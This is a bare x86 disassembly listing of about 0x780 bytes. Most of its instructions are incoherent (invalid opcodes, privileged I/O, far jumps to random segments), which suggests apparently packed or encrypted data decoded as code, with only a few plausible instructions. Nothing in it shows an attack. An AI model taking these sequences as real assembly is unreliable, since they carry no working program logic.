  408934:	mov    eax,0xabf0106c
  408939:	aaa    
  40893a:	daa    
  40893b:	jae    0x4088f2
  40893d:	cmp    ebp,DWORD PTR [edx-0xb]
  408940:	and    al,0x6d
  408942:	xlat   BYTE PTR ds:[ebx]
  408943:	imul   edi,DWORD PTR [esi+0x682f9ff0],0xbbd5ca4a
  40894d:	mov    cl,0xfe
  40894f:	das    
  408950:	dec    esp
  408951:	in     eax,0xc3
  408953:	jo     0x408974
  408955:	je     0x4089bc
  408957:	sbb    al,BYTE PTR [edi+0x7e]
  40895a:	dec    eax
  40895b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40895c:	add    ch,dl
  40895e:	pop    ss
  40895f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408960:	mov    BYTE PTR [esi-0x3d79112b],bl
  408966:	fdiv   DWORD PTR [edx+ecx*4-0x1f]
  40896a:	daa    
  40896b:	sar    dl,cl
  40896d:	and    eax,0xb449fe0d
  408972:	pop    esp
  408973:	push   esp
  408974:	jno    0x4089b0
  408976:	inc    ecx
  408977:	mov    eax,ds:0x9320685c
  40897c:	aas    
  40897d:	jbe    0x408939
  40897f:	les    edi,FWORD PTR ds:0xc4de293
  408985:	stc    
  408986:	push   ecx
  408987:	mov    esp,DWORD PTR [edx+0x5990c3c5]
  40898d:	sbb    ecx,DWORD PTR [ebx*8+0x76d74a1b]
  408994:	(bad)  
  408995:	fnstcw WORD PTR [ebp+0x40]
  408998:	icebp  
  408999:	enter  0xbe31,0x27
  40899d:	clc    
  40899e:	test   bh,ah
  4089a0:	arpl   WORD PTR [eax-0x49e87aaa],cx
  4089a6:	or     DWORD PTR [ecx],0x3b3a6f16
  4089ac:	push   edi
  4089ad:	mov    ch,0x6c
  4089af:	sub    ch,BYTE PTR [eax+0x7e]
  4089b2:	hlt    
  4089b3:	xor    DWORD PTR [ecx],eax
  4089b5:	repnz adc eax,0xba018f40
  4089bb:	mov    esi,0x3ad6f6b6
  4089c0:	add    BYTE PTR [esi],ah
  4089c2:	pop    esp
  4089c3:	repz xor eax,0x5448a4af
  4089c9:	push   edx
  4089ca:	mov    cl,0x6b
  4089cc:	stos   BYTE PTR es:[edi],al
  4089cd:	retf   0xecf3
  4089d0:	ror    BYTE PTR [ecx+0x43d640c1],0x8d
  4089d7:	mov    eax,0x2fe35bc0
  4089dc:	pop    ecx
  4089dd:	pop    es
  4089de:	fidiv  DWORD PTR [ecx+0x6f]
  4089e1:	lds    ebp,FWORD PTR [eax]
  4089e3:	mov    edx,0xcb2c8eb9
  4089e8:	lahf   
  4089e9:	xor    ecx,DWORD PTR [edi]
  4089eb:	js     0x40899b
  4089ed:	sub    ah,ah
  4089ef:	add    ch,BYTE PTR [eax]
  4089f1:	jbe    0x4089c0
  4089f3:	arpl   WORD PTR [ebx],sp
  4089f5:	in     al,0x80
  4089f7:	rcl    BYTE PTR [esi],1
  4089f9:	repz dec ebp
  4089fb:	test   DWORD PTR [edi],esp
  4089fd:	pop    ebx
  4089fe:	add    eax,0x4f06644a
  408a03:	or     ecx,ebp
  408a05:	xchg   esi,esp
  408a07:	inc    ecx
  408a08:	jbe    0x408a1f
  408a0a:	lock lods al,BYTE PTR ds:[esi]
  408a0c:	and    cl,BYTE PTR [ecx-0x24233fd1]
  408a12:	clc    
  408a13:	not    BYTE PTR [ebp+0x39]
  408a16:	loop   0x408a01
  408a18:	xor    al,0x9d
  408a1a:	bswap  esi
  408a1c:	rcr    DWORD PTR [ebx-0x539fb11a],cl
  408a22:	adc    edx,ebx
  408a24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a25:	dec    esp
  408a26:	mov    dh,0x78
  408a28:	sub    al,bl
  408a2a:	rcr    BYTE PTR [esi-0x71],0x7e
  408a2e:	iret   
  408a2f:	mov    dh,0x28
  408a31:	jp     0x4089f0
  408a33:	or     bl,BYTE PTR [ecx+0x65]
  408a36:	aad    0xca
  408a38:	xchg   esp,eax
  408a39:	mov    eax,0xb8a829bb
  408a3e:	inc    edi
  408a3f:	fcomi  st,st(7)
  408a41:	push   ss
  408a42:	(bad)  
  408a43:	cdq    
  408a44:	dec    ecx
  408a45:	(bad)  
  408a46:	gs mov dl,0x58
  408a49:	mov    eax,ds:0xc61ae13a
  408a4e:	inc    ebx
  408a4f:	mov    ss,WORD PTR [esi]
  408a51:	shr    DWORD PTR [edi+0x2869a14d],cl
  408a57:	xchg   esp,eax
  408a58:	mov    edi,fs
  408a5a:	cmp    DWORD PTR [ebx-0xc196dbb],edi
  408a60:	loopne 0x408a19
  408a62:	test   eax,0xf70162d0
  408a67:	mov    eax,0x93eacf60
  408a6c:	into   
  408a6d:	icebp  
  408a6e:	jg     0x408a64
  408a70:	ds popf 
  408a72:	std    
  408a73:	or     dl,cl
  408a75:	(bad)  ss:[ebp-0x28]
  408a79:	xchg   ebx,eax
  408a7a:	push   edx
  408a7b:	inc    ebp
  408a7c:	mov    ebp,?
  408a7e:	(bad)  
  408a7f:	mov    cl,0xfd
  408a81:	pop    edx
  408a82:	test   eax,0x99ca0f04
  408a87:	or     DWORD PTR [esi-0x2d],esi
  408a8a:	or     al,0x67
  408a8c:	push   cs
  408a8d:	test   DWORD PTR [ebp-0x47],ebp
  408a90:	mov    ebp,0xd9ab5e9d
  408a95:	out    dx,eax
  408a96:	jb     0x408a42
  408a98:	lods   al,BYTE PTR ds:[esi]
  408a99:	pop    ebp
  408a9a:	xlat   BYTE PTR ds:[ebx]
  408a9b:	sar    DWORD PTR [ebp-0x32],0xd5
  408a9f:	neg    ecx
  408aa1:	xor    esp,DWORD PTR [edx-0x4a]
  408aa4:	std    
  408aa5:	imul   esp,DWORD PTR [ecx-0x43],0x6b91f74c
  408aac:	ret    0x6c33
  408aaf:	xor    esi,edx
  408ab1:	std    
  408ab2:	push   eax
  408ab3:	fdivr  QWORD PTR [ecx-0x1ab9ac20]
  408ab9:	push   cs
  408aba:	fild   DWORD PTR [ecx]
  408abc:	iret   
  408abd:	and    ecx,DWORD PTR [ecx+ebx*2-0x50]
  408ac1:	fsub   DWORD PTR [edi]
  408ac3:	je     0x408aeb
  408ac5:	pop    es
  408ac6:	ja     0x408a49
  408ac8:	inc    ebx
  408ac9:	pop    esp
  408aca:	cmp    dh,BYTE PTR [edi+0x4ecd192c]
  408ad0:	rep outs dx,BYTE PTR ds:[esi]
  408ad2:	lock adc bl,bl
  408ad5:	ret    
  408ad6:	lods   al,BYTE PTR ds:[esi]
  408ad7:	stos   BYTE PTR es:[edi],al
  408ad8:	repz ficomp WORD PTR [esi]
  408adb:	dec    eax
  408adc:	pop    esi
  408add:	sbb    bl,dl
  408adf:	push   esp
  408ae0:	test   DWORD PTR [edx+0x879f9d1],0xfa2e1fac
  408aea:	(bad)  
  408aeb:	imul   DWORD PTR [ecx+ebx*1-0x547b20a5]
  408af2:	xchg   ecx,eax
  408af3:	mov    dh,0xe
  408af6:	adc    eax,0xac2bc9eb
  408afb:	sub    DWORD PTR [ebx+0x7c2c8ad9],esi
  408b01:	repnz in al,dx
  408b03:	push   esi
  408b04:	cmp    BYTE PTR gs:[eax],0x9c
  408b08:	inc    esi
  408b09:	scas   al,BYTE PTR es:[edi]
  408b0a:	movd   edi,mm5
  408b0d:	jmp    0xce35:0x349db963
  408b14:	mov    dh,dh
  408b16:	mov    cl,0xa3
  408b18:	unpcklps xmm1,XMMWORD PTR [ebp+0x6a718fb3]
  408b1f:	mov    cl,0xfd
  408b21:	dec    ebx
  408b22:	and    eax,0x1dd21f7
  408b27:	jecxz  0x408aab
  408b29:	cmp    esp,DWORD PTR [esi+0x6fafd2d7]
  408b2f:	cmp    eax,0xc4091999
  408b34:	jmp    0x5880:0xdba0a924
  408b3b:	aam    0x80
  408b3d:	jmp    0x35cd:0xfaf86a88
  408b44:	push   ebx
  408b45:	add    cl,bl
  408b47:	pop    esp
  408b48:	adc    DWORD PTR [ecx],esp
  408b4a:	add    BYTE PTR [eax],ah
  408b4c:	(bad)  
  408b4d:	xor    DWORD PTR [edx],esp
  408b4f:	imul   edx,DWORD PTR ds:0x673f3a71,0x13e19332
  408b59:	mul    ah
  408b5b:	jmp    0x408bce
  408b5d:	rcl    BYTE PTR [edx+eiz*1-0x5a],0x2d
  408b62:	cmp    bh,BYTE PTR [edi+0x75]
  408b65:	jne    0x408b0b
  408b67:	ficom  WORD PTR [ecx+0x78]
  408b6a:	xor    DWORD PTR [ebp+0x30],0xffffffee
  408b6e:	pop    esp
  408b6f:	cwde   
  408b70:	xor    BYTE PTR [ebx],0xe
  408b73:	clc    
  408b74:	in     eax,dx
  408b75:	push   eax
  408b76:	pop    ebp
  408b77:	jecxz  0x408b23
  408b79:	dec    esi
  408b7a:	repnz hlt 
  408b7c:	test   eax,0x7e196dd6
  408b81:	xor    bh,BYTE PTR [ecx-0x5e]
  408b84:	leave  
  408b85:	jmp    0x880b:0x41d7151f
  408b8c:	adc    edx,DWORD PTR es:0x1a227ac3
  408b93:	jle    0x408bb5
  408b95:	(bad)  
  408b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b98:	popf   
  408b99:	sbb    BYTE PTR [esi+eiz*8-0x7d],bl
  408b9d:	clc    
  408b9e:	fucomi st,st(3)
  408ba0:	scas   al,BYTE PTR es:[edi]
  408ba1:	pop    ebp
  408ba2:	test   al,0x32
  408ba4:	pop    ebx
  408ba5:	aas    
  408ba6:	scas   al,BYTE PTR es:[edi]
  408ba7:	pop    esi
  408ba8:	outs   dx,DWORD PTR ds:[esi]
  408ba9:	xchg   bh,bh
  408bab:	jae    0x408bdd
  408bad:	popa   
  408bae:	gs jno 0x408b6e
  408bb1:	ds pop esi
  408bb3:	xor    cl,BYTE PTR [edi-0x54]
  408bb6:	push   0xffffffb2
  408bb8:	push   ecx
  408bb9:	pop    es
  408bba:	cmp    cl,BYTE PTR [esi-0x63]
  408bbd:	ret    
  408bbe:	inc    ebp
  408bbf:	dec    eax
  408bc0:	cmp    ebx,ecx
  408bc2:	clc    
  408bc3:	and    al,0x84
  408bc5:	sbb    BYTE PTR [eax-0x2623aca5],ah
  408bcb:	push   ebp
  408bcc:	outs   dx,DWORD PTR ds:[esi]
  408bcd:	repz aas 
  408bcf:	sub    DWORD PTR [esi],eax
  408bd1:	in     al,dx
  408bd2:	test   DWORD PTR [ebp-0x6d],0x8663447d
  408bd9:	or     ch,BYTE PTR [edx]
  408bdb:	out    dx,al
  408bdc:	data16 loop 0x408be9
  408bdf:	daa    
  408be0:	push   DWORD PTR [esi]
  408be2:	jns    0x408c47
  408be4:	jo     0x408c3d
  408be6:	xchg   ecx,eax
  408be7:	dec    edi
  408be8:	ret    0xc4f8
  408beb:	mov    esi,0x15c5f2ef
  408bf0:	shr    DWORD PTR [edi+0x3e93fd49],0x50
  408bf7:	cld    
  408bf8:	sub    BYTE PTR [edi-0x390adacf],0x86
  408bff:	icebp  
  408c00:	in     eax,0x89
  408c02:	or     eax,0x940c62cf
  408c07:	mov    bl,BYTE PTR cs:[ecx+ebp*2]
  408c0b:	repz inc esp
  408c0d:	out    dx,eax
  408c0e:	mov    ds:0xb4508add,al
  408c13:	fcmovne st,st(5)
  408c15:	mov    bl,0xe1
  408c17:	adc    DWORD PTR [ecx-0x1a1dd2c7],edx
  408c1d:	push   eax
  408c1e:	mov    ds:0xb84a5ae9,al
  408c23:	ror    DWORD PTR [ebp-0x5513068],0x1b
  408c2a:	mov    eax,ds:0x5959840b
  408c2f:	aam    0xbb
  408c31:	adc    BYTE PTR [esi-0x2d18050f],bh
  408c37:	clc    
  408c38:	test   eax,0x589e8185
  408c3d:	push   edi
  408c3e:	and    BYTE PTR [ebp-0x4d],dh
  408c41:	ja     0x408c45
  408c43:	mov    eax,DWORD PTR [ebp-0x20]
  408c46:	mov    edx,DWORD PTR [ebp-0x8]
  408c49:	mov    edi,DWORD PTR [ebp-0x24]
  408c4c:	xor    edx,ecx
  408c4e:	jmp    0x408fc4
  408c53:	inc    esp
  408c54:	pusha  
  408c55:	sub    BYTE PTR [esi],bh
  408c57:	sub    BYTE PTR [esi+0x72],dl
  408c5a:	(bad)
  408c5f:	xlat   BYTE PTR ds:[ebx]
  408c60:	xchg   ecx,eax
  408c61:	mov    dh,BYTE PTR [edi+0x6c]
  408c64:	in     al,0x7c
  408c66:	jl     0x408c3f
  408c68:	jns    0x408ce6
  408c6a:	jl     0x408c9b
  408c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c6d:	nop
  408c6e:	inc    esp
  408c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c70:	add    DWORD PTR [ebx],edi
  408c72:	push   eax
  408c73:	xchg   esp,eax
  408c74:	xchg   edx,eax
  408c75:	sahf   
  408c76:	adc    eax,0x30ff67a6
  408c7b:	push   eax
  408c7c:	jno    0x408c56
  408c7e:	call   FWORD PTR [eax+0x15]
  408c81:	mov    ds:0x41a99880,al
  408c86:	xchg   esp,eax
  408c87:	pop    eax
  408c88:	retf   0xe8f6
  408c8b:	in     eax,0x17
  408c8d:	jmp    0xb4041713
  408c92:	(bad)  
  408c93:	sahf   
  408c94:	jge    0x408cb4
  408c96:	push   ss
  408c97:	(bad)
  408c9a:	inc    edx
  408c9b:	mov    bh,0xe
  408c9d:	daa    
  408c9e:	add    edx,DWORD PTR [ebx-0x1a]
  408ca1:	mov    ecx,0x2e5fbc88
  408ca6:	test   BYTE PTR [ebx],ah
  408ca8:	arpl   bx,si
  408caa:	imul   esp,DWORD PTR [edx-0x7326dac4],0x76
  408cb1:	xor    eax,0xe1320183
  408cb6:	sbb    DWORD PTR [esi-0xbdf77b9],0xffffffcf
  408cbd:	and    BYTE PTR [edi+0x52abd2da],al
  408cc3:	imul   eax,eax,0xef242de9
  408cc9:	cs xchg ecx,eax
  408ccb:	test   BYTE PTR [eax+0xc],bh
  408cce:	mov    al,ds:0x7ad5c3f7
  408cd3:	fs pop ds
  408cd5:	sub    DWORD PTR [esi-0x1c],esp
  408cd8:	out    0xf0,eax
  408cda:	mov    bh,0x30
  408cdc:	mov    al,0xc3
  408cde:	xchg   esp,eax
  408cdf:	jne    0x408c7d
  408ce1:	push   ss
  408ce2:	jecxz  0x408d55
  408ce4:	mov    ah,0x69
  408ce6:	lods   eax,DWORD PTR ds:[esi]
  408ce7:	mov    ch,0xef
  408ce9:	jno    0x408c93
  408ceb:	outs   dx,DWORD PTR es:[esi]
  408ced:	rcl    DWORD PTR [ebp-0x1],cl
  408cf0:	push   cs
  408cf1:	aaa    
  408cf2:	push   ss
  408cf3:	aaa    
  408cf4:	inc    edx
  408cf5:	dec    edx
  408cf6:	pop    ss
  408cf7:	mov    dh,0x6f
  408cf9:	test   ebx,esp
  408cfb:	mov    dh,0xb1
  408cfd:	xchg   esi,eax
  408cfe:	add    BYTE PTR [esi+0x1709181f],0xe6
  408d05:	sti    
  408d06:	or     bl,BYTE PTR [ebp-0x14]
  408d09:	dec    ebx
  408d0a:	xor    dl,al
  408d0c:	sbb    edi,DWORD PTR [ebp-0x47]
  408d0f:	adc    eax,0x6dbba6d9
  408d14:	fidivr WORD PTR [edx-0x6a71362]
  408d1a:	dec    esp
  408d1b:	push   ebp
  408d1c:	nop
  408d1d:	add    ch,bh
  408d1f:	aaa    
  408d20:	(bad)  
  408d21:	out    dx,eax
  408d22:	xchg   edi,eax
  408d23:	or     esi,DWORD PTR [esi+0x2]
  408d26:	retf   0x67e8
  408d29:	lahf   
  408d2a:	imul   ecx,ebx,0x5b
  408d2d:	jmp    0x408d5c
  408d2f:	sahf   
  408d30:	test   al,0xf6
  408d32:	pop    ecx
  408d33:	sbb    esp,ebx
  408d35:	icebp  
  408d36:	sbb    eax,DWORD PTR [esi+0x60]
  408d39:	arpl   ax,bp
  408d3b:	add    eax,0x54af2af2
  408d40:	xchg   edx,eax
  408d41:	sbb    BYTE PTR [edx-0x3c],al
  408d44:	ins    BYTE PTR es:[edi],dx
  408d45:	retf   
  408d46:	std    
  408d47:	ja     0x408d82
  408d49:	xchg   edx,eax
  408d4a:	or     dl,0x28
  408d4d:	mov    dl,0x22
  408d4f:	cmp    edx,DWORD PTR [edx-0x213a1c14]
  408d55:	xchg   esi,eax
  408d56:	mov    ?,WORD PTR [esi-0x1d]
  408d59:	mov    ebp,cs
  408d5b:	mov    al,ds:0xd4f9a792
  408d60:	mov    al,ds:0x3798b5bc
  408d65:	push   edi
  408d66:	mov    dh,0xed
  408d68:	push   0x20
  408d6a:	fsubr  QWORD PTR [edi+0x18]
  408d6d:	mov    al,0xbf
  408d6f:	cmp    DWORD PTR [ebx-0x7f1b1d00],edx
  408d75:	add    DWORD PTR [ecx],esp
  408d77:	and    DWORD PTR [ecx+esi*2-0x3c],ecx
  408d7b:	xchg   DWORD PTR [edx+0x648d6d2],ebx
  408d81:	out    0xa2,eax
  408d83:	dec    ebx
  408d84:	(bad)  
  408d85:	cs xchg esi,eax
  408d87:	jo     0x408db5
  408d89:	clc    
  408d8a:	inc    eax
  408d8b:	pop    ebx
  408d8c:	repz push ebp
  408d8e:	inc    edx
  408d8f:	out    dx,eax
  408d90:	dec    esi
  408d91:	mov    bh,0xae
  408d93:	push   ss
  408d94:	sahf   
  408d95:	mov    ecx,0x40ca34e5
  408d9a:	sbb    eax,0x3c4320f5
  408d9f:	or     BYTE PTR [ecx-0x67],cl
  408da2:	fldenv [ebp+edx*4-0x6a]
  408da6:	cmp    al,BYTE PTR [edx+0x7f9645a8]
  408dac:	mov    edi,0x6e110b3a
  408db1:	jle    0x408d41
  408db3:	jge    0x408d41
  408db5:	ficomp DWORD PTR [edx]
  408db7:	ins    DWORD PTR es:[edi],dx
  408db8:	loop   0x408d7b
  408dba:	jp     0x408d8e
  408dbc:	sbb    al,0xee
  408dbe:	adc    al,0x2d
  408dc0:	mov    ch,0xf3
  408dc2:	push   ss
  408dc3:	dec    esi
  408dc4:	push   cs
  408dc5:	inc    ebx
  408dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dc7:	ret    0x445d
  408dca:	shl    cl,1
  408dcc:	repz sbb eax,eax
  408dcf:	jnp    0x408d7a
  408dd1:	ins    DWORD PTR es:[edi],dx
  408dd2:	sti    
  408dd3:	mov    ds:0x8ccbefd9,eax
  408dd8:	sub    eax,0x2208d758
  408ddd:	pop    esi
  408dde:	pop    esi
  408ddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408de0:	mov    al,ds:0x330f2cd5
  408de5:	enter  0xc785,0xcc
  408de9:	out    0x6a,al
  408deb:	int    0xde
  408ded:	pop    esi
  408dee:	mov    DWORD PTR [ebx-0x5c],esp
  408df1:	(bad)  
  408df2:	sbb    bl,BYTE PTR [edx]
  408df4:	xchg   DWORD PTR [eax],ecx
  408df6:	sti    
  408df7:	aad    0xca
  408df9:	dec    edx
  408dfa:	xlat   BYTE PTR ds:[ebx]
  408dfb:	add    eax,0xaafed601
  408e00:	leave  
  408e01:	addr16 dec esi
  408e03:	in     al,dx
  408e04:	jns    0x408dc0
  408e06:	push   ebp
  408e07:	sbb    bl,BYTE PTR [edx-0x42f97dab]
  408e0d:	dec    esi
  408e0e:	repnz lea ebx,[ebx-0x5cae43fd]
  408e15:	or     esi,eax
  408e17:	ins    BYTE PTR es:[edi],dx
  408e18:	div    DWORD PTR [ebx]
  408e1a:	fistp  QWORD PTR [esi+0x6b]
  408e1d:	out    0xda,eax
  408e1f:	int    0x93
  408e21:	fldcw  WORD PTR [esi]
  408e23:	das    
  408e24:	fisub  DWORD PTR [ecx-0x12]
  408e27:	sub    DWORD PTR [eax],0xfa4c3a64
  408e2d:	ins    DWORD PTR es:[edi],dx
  408e2e:	push   esi
  408e2f:	arpl   WORD PTR [ecx],ax
  408e31:	int3   
  408e32:	adc    al,0x7d
  408e34:	cmp    ch,BYTE PTR fs:0x312f0f09
  408e3b:	hlt    
  408e3c:	dec    esi
  408e3d:	inc    edi
  408e3e:	sahf   
  408e3f:	jle    0x408e75
  408e41:	mov    dl,0xbd
  408e43:	imul   esi,esp,0x1f988ff9
  408e49:	sbb    BYTE PTR ds:0x7e13e279,0xbb
  408e50:	push   ss
  408e51:	ins    BYTE PTR es:[edi],dx
  408e52:	outs   dx,BYTE PTR ds:[esi]
  408e53:	add    dh,bh
  408e55:	push   ebx
  408e56:	pop    es
  408e57:	xlat   BYTE PTR ds:[ebx]
  408e58:	out    dx,eax
  408e59:	adc    ecx,DWORD PTR [edi]
  408e5b:	and    DWORD PTR [edx+edx*4],edi
  408e5e:	lock inc edi
  408e60:	jl     0x408df0
  408e62:	stos   DWORD PTR es:[edi],eax
  408e63:	cmc    
  408e64:	out    0xc9,al
  408e66:	fistp  DWORD PTR [esi-0x5b]
  408e69:	repnz sti 
  408e6b:	push   cs
  408e6c:	add    al,0x56
  408e6e:	cld    
  408e6f:	pop    eax
  408e70:	add    dh,BYTE PTR [ebp+0x3699572f]
  408e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e77:	mov    eax,0x9dabb9d7
  408e7c:	repz xchg edi,eax
  408e7e:	inc    edx
  408e7f:	add    ebx,DWORD PTR [eax-0x59510123]
  408e85:	pop    ebp
  408e86:	ret    
  408e87:	mov    ch,0x2b
  408e89:	push   edi
  408e8a:	mov    ds:0x556ccd56,al
  408e8f:	lods   eax,DWORD PTR ds:[esi]
  408e90:	sbb    ebp,DWORD PTR [ecx-0x7c]
  408e93:	ins    BYTE PTR es:[edi],dx
  408e94:	cmp    DWORD PTR [ecx+0x25],eax
  408e97:	retf   0x8362
  408e9a:	add    DWORD PTR [edx],esp
  408e9c:	(bad)  
  408e9d:	ss gs add al,0xc1
  408ea1:	lods   eax,DWORD PTR ds:[esi]
  408ea2:	sub    esp,DWORD PTR [edx-0x6b]
  408ea5:	jle    0x408ede
  408ea7:	add    BYTE PTR [edi-0x7572521b],0x6e
  408eae:	sbb    BYTE PTR [ebx],cl
  408eb0:	add    al,0x2d
  408eb2:	pop    ds
  408eb3:	jp     0x408e7f
  408eb5:	jg     0x408e5b
  408eb7:	xchg   edx,eax
  408eb8:	xchg   edx,eax
  408eb9:	(bad)  
  408eba:	mov    cl,0xeb
  408ebc:	rcr    DWORD PTR [ebp+0x17],0xff
  408ec0:	sbb    bh,bl
  408ec2:	or     eax,0xf59cece1
  408ec7:	xchg   ecx,eax
  408ec8:	jb     0x408f21
  408eca:	test   al,0x9c
  408ecc:	push   edx
  408ecd:	jecxz  0x408f15
  408ecf:	dec    ecx
  408ed0:	(bad)  
  408ed2:	fst    QWORD PTR ds:0x5ebfa2b8
  408ed8:	repz pop es
  408eda:	add    bl,ch
  408edc:	jp     0x408f2e
  408ede:	xchg   ebx,eax
  408edf:	push   ds
  408ee0:	dec    esp
  408ee1:	jnp    0x408f27
  408ee3:	add    al,0x67
  408ee5:	int3   
  408ee6:	inc    ebp
  408ee7:	rcr    BYTE PTR [eax+0x47],cl
  408eea:	fnstenv [ebp-0x2aea17db]
  408ef0:	dec    esi
  408ef1:	push   ds
  408ef2:	fbstp  TBYTE PTR [esi-0x5d]
  408ef5:	pusha  
  408ef6:	data16 ins BYTE PTR es:[edi],dx
  408ef8:	jmp    0xa3cd:0x3c3f887e
  408eff:	inc    ebp
  408f00:	pop    es
  408f01:	out    dx,al
  408f02:	fisttp QWORD PTR [eax+0x4df3f315]
  408f08:	and    al,0xc6
  408f0a:	popa   
  408f0b:	dec    ebx
  408f0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f0d:	(bad)  
  408f0e:	jl     0x408f4e
  408f10:	cmp    eax,0xcb80c9be
  408f15:	cmp    edi,esp
  408f17:	adc    DWORD PTR [ecx],eax
  408f19:	pop    edi
  408f1a:	lock vunpcklps ymm2,ymm3,YMMWORD PTR [eax+edx*8-0xf235f62]
  408f24:	adc    BYTE PTR [edi-0x7a79ed61],dl
  408f2a:	cmp    al,0xb8
  408f2c:	mov    dh,BYTE PTR ds:0xb0b3208e
  408f32:	cmp    al,0x61
  408f34:	lods   al,BYTE PTR ds:[esi]
  408f35:	jo     0x408fb4
  408f37:	sbb    ebx,DWORD PTR [eax+0x10a66f6e]
  408f3d:	or     BYTE PTR [edx],al
  408f3f:	(bad)  
  408f41:	lock pop ebp
  408f43:	stos   BYTE PTR es:[edi],al
  408f44:	xlat   BYTE PTR ds:[ebx]
  408f45:	jae    0x408f6f
  408f47:	mov    eax,ds:0x2d75230e
  408f4c:	jle    0x408fc9
  408f4e:	jns    0x408fc7
  408f50:	stc    
  408f51:	retf   0x1212
  408f54:	dec    esi
  408f55:	mov    bh,0xc9
  408f57:	or     DWORD PTR [edx+0x71255db5],0xffffffed
  408f5e:	loopne 0x408eee
  408f60:	mov    dh,0x10
  408f62:	dec    ebp
  408f63:	js     0x408ef9
  408f65:	xor    dl,bh
  408f67:	jp     0x408f07
  408f69:	mov    ch,BYTE PTR [ecx]
  408f6b:	mov    WORD PTR [ecx-0x74c62010],es
  408f71:	mov    BYTE PTR [eax+ebp*2+0x1e42e790],bl
  408f78:	ret    
  408f79:	xchg   ebp,eax
  408f7a:	add    DWORD PTR [eax],ebx
  408f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f7d:	pop    esi
  408f7e:	jo     0x408f54
  408f80:	jb     0x408f4f
  408f82:	mov    eax,esp
  408f84:	iret   
  408f85:	mov    edx,0xa782ef5
  408f8a:	imul   DWORD PTR [ebp+0x3e]
  408f8d:	fmul   QWORD PTR [esi-0x283535b2]
  408f93:	add    BYTE PTR [edx+0x44312dcd],bh
  408f99:	lahf   
  408f9a:	imul   ebx,DWORD PTR [edx+0x1b],0x50
  408f9e:	mov    dh,0x69
  408fa0:	fistp  DWORD PTR [edi]
  408fa2:	push   0x1956f8de
  408fa7:	cmp    ebp,esp
  408fa9:	dec    ecx
  408faa:	leave  
  408fab:	adc    eax,0x97e7b884
  408fb0:	push   es
  408fb1:	xor    esp,esi
  408fb3:	jle    0x408f3c
  408fb5:	jp     0x408f7f
  408fb7:	imul   ebp,DWORD PTR [esi-0x149a38c6],0x7
  408fbe:	adc    DWORD PTR ds:0x3f0de436,eax
  408fc4:	add    edx,esi
  408fc6:	imul   edx,edi
  408fc9:	sub    DWORD PTR [eax],edx
  408fcb:	jmp    0x409341
  408fd0:	or     eax,0x738240b6
  408fd5:	jb     0x408fa4
  408fd7:	mov    cl,0xfd
  408fd9:	push   eax
  408fda:	sbb    DWORD PTR [eax+ecx*2-0x1],ebp
  408fde:	lods   al,BYTE PTR ds:[esi]
  408fdf:	lods   al,BYTE PTR ds:[esi]
  408fe0:	(bad)  
  408fe1:	loopne 0x40905f
  408fe3:	jl     0x408fbc
  408fe5:	jns    0x409063
  408fe7:	jl     0x409045
  408fe9:	and    eax,0x637a2e81
  408fee:	in     al,0x2a
  408ff0:	int    0xac
  408ff2:	adc    esi,DWORD PTR [ebp-0x5b]
  408ff5:	out    0x8,eax
  408ff7:	cli    
  408ff8:	or     dx,WORD PTR [edx-0x7009d26c]
  408fff:	and    eax,0xb7b38bce
  409004:	sub    dl,bh
  409006:	outs   dx,BYTE PTR ds:[esi]
  409007:	fstp   TBYTE PTR [ebp+0x1b]
  40900a:	sbb    ah,BYTE PTR [edi+ebx*1]
  40900d:	add    esp,edi
  40900f:	addr16 hlt 
  409011:	das    
  409012:	dec    esi
  409013:	push   0xffffffb1
  409015:	or     BYTE PTR [eax+edx*2-0x5e],ch
  409019:	sbb    eax,0x931e59a9
  40901e:	nop
  40901f:	mov    bh,0x7d
  409021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409022:	sub    ch,BYTE PTR [ebp-0x67]
  409025:	stc    
  409026:	call   0xadf3:0xd23a39c2
  40902d:	xchg   BYTE PTR [esi-0xc3f2f49],dl
  409033:	adc    bh,dl
  409035:	xlat   BYTE PTR ds:[ebx]
  409036:	pop    es
  409037:	gs iret 
  409039:	aaa    
  40903a:	xor    eax,0xa26510a6
  40903f:	mov    ebx,0x8b4c1834
  409044:	ins    DWORD PTR es:[edi],dx
  409045:	pop    ebp
  409046:	lods   eax,DWORD PTR ds:[esi]
  409047:	dec    ebx
  409048:	ss xchg edx,eax
  40904a:	jp     0x40909b
  40904c:	ret    
  40904d:	and    al,0x8
  40904f:	xchg   BYTE PTR [edi-0x74],dl
  409052:	adc    edx,DWORD PTR [ebx]
  409054:	push   es
  409055:	inc    edx
  409056:	stc    
  409057:	sbb    eax,0xf1f1aafc
  40905c:	xor    BYTE PTR [ebx-0x24],0x21
  409060:	and    DWORD PTR [ecx+ecx*1-0x62ebebfd],ebx
  409067:	in     al,0x80
  409069:	enter  0x71a,0xa6
  40906d:	push   ecx
  40906e:	dec    ebp
  40906f:	mov    ds:0x47a90db3,al
  409074:	cmp    eax,0xbc436c66
  409079:	fnstsw WORD PTR [edx+0x7f]
  40907c:	ins    BYTE PTR es:[edi],dx
  40907d:	pop    ecx
  40907e:	lahf   
  40907f:	xchg   esi,eax
  409080:	mov    BYTE PTR [ecx-0x76a28f9e],ah
  409086:	imul   eax,DWORD PTR [esi+eiz*8],0x30
  40908a:	icebp  
  40908b:	inc    eax
  40908c:	mov    ?,WORD PTR [esi+0x41]
  40908f:	call   0x4c53:0x944ed113
  409096:	add    al,0xd
  409098:	cmc    
  409099:	and    BYTE PTR [edi],bh
  40909b:	xchg   edx,eax
  40909c:	arpl   WORD PTR [esi+0xf],dx
  40909f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090a0:	xchg   al,ch
  4090a2:	inc    ebx
  4090a3:	std    
  4090a4:	rcl    BYTE PTR [ebp+0x37dd7062],1
  4090aa:	data16 jp 0x40908a
  4090ad:	push   edx
  4090ae:	repnz mov fs,edi
